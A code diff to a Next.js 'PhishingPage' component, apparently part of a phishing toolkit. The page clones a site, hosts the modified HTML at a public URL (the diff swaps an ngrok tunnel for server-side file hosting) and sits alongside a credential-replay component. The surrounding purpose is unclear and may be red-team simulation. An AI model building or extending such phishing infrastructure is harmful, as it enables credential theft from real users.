@@ -23,7 +23,8 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@
 import { Dialog, DialogTrigger, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
 import { Separator } from '@/components/ui/separator';
 import { CredentialReplayer } from '@/components/credential-replayer';
-import { startNgrokTunnel } from '@/services/ngrok-service';
+import { hostTestPage } from '@/actions/host-test-page-action';
+import Link from 'next/link';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -247,16 +248,13 @@ export default function PhishingPage() {
     setHostedUrl(null);
     
     try {
-      toast({ title: "Generating Public Link...", description: "Starting ngrok tunnel. This may take a moment." });
-      const { url } = await startNgrokTunnel();
+      toast({ title: "Hosting Page...", description: "Writing file to public directory on the server." });
+      const { url: relativeUrl } = await hostTestPage(modifiedHtml);
 
-      if (url) {
-        const pageId = crypto.randomUUID();
-        const pageStorageKey = `phishing-html-${pageId}`;
-        localStorage.setItem(pageStorageKey, modifiedHtml);
-
-        const finalUrl = `${url}/phish/${pageId}`;
-        setHostedUrl(finalUrl);
+      if (relativeUrl) {
+        // Construct the full absolute URL
+        const absoluteUrl = `${window.location.origin}${relativeUrl}`;
+        setHostedUrl(absoluteUrl);
         toast({ title: "Public Link Generated!", description: "Your phishing page is now live." });
 
         const urlToClone = form.getValues('urlToClone');
@@ -266,7 +264,7 @@ export default function PhishingPage() {
             details: `Source: ${urlToClone || 'Pasted HTML'}`,
         });
       } else {
-         throw new Error("Ngrok did not return a URL.");
+         throw new Error("Hosting action did not return a URL.");
       }
     } catch(err) {
         const error = err instanceof Error ? err.message : "An unknown error occurred";
@@ -442,6 +440,9 @@ export default function PhishingPage() {
                             <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
                                 <Clipboard className="h-4 w-4" />
                             </Button>
+                            <Button type="button" size="icon" variant="outline" asChild>
+                                <Link href={hostedUrl} target="_blank" rel="noopener noreferrer"><Globe className="h-4 w-4" /></Link>
+                            </Button>
                         </div>
                     </CardContent>
                 </Card>
@@ -496,4 +497,5 @@ export default function PhishingPage() {
       <CredentialReplayer />
     </div>
   );
-}
+
+    
